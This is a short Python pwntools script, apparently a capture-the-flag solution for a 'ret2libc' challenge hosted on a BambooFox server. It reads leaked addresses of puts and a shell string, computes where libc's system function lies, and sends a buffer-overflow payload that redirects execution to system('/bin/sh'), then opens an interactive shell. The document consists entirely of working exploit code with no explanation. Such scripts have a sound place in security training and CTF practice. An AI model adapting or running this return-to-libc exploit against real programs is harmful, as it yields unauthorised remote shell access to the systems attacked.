#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 11002)
# r = process('./ret2libc')

elf = ELF('libc.so.6')

r.recvuntil('is ')
sh = int(r.recvline()[:-1], 16)
log.info(hex(sh))
r.recvuntil('is ')
puts_addr = int(r.recvline()[:-1], 16)
log.info(hex(puts_addr))

libc = puts_addr - elf.symbols['puts']
system = libc + elf.symbols['system']

r.sendline('a' * 32 + p32(system) + 'a' * 4 + p32(sh))

r.interactive()
